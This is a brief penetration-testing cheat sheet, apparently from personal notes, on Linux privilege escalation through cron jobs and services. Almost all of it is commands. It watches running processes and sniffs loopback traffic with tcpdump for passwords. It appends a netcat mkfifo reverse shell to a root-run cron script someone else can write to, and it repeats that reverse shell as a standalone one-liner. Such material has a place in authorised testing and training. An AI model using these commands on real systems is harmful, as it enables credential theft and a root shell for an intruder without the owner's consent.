# Cron Jobs & Services

## Watch Processes for Credential Leakage

```bash
watch -n 1 "ps -aux | grep pass"
```

**Sniff local traffic for passwords:**

```bash
sudo tcpdump -i lo -A | grep "pass"
```

***

## Cron Job Abuse (Insecure File Permissions)

```bash
cat /var/log/cron.log
grep "CRON" /var/log/syslog (needs adm group acces ;) ) 
ls -lha /etc/cron*
```

If a root cron job runs a script you can write to, inject a reverse shell:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 |nc <ip> 1234 >/tmp/f" >> user_backups.sh
```

***

## One-Liner Reverse Shell

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <ip> 1234 >/tmp/f
```
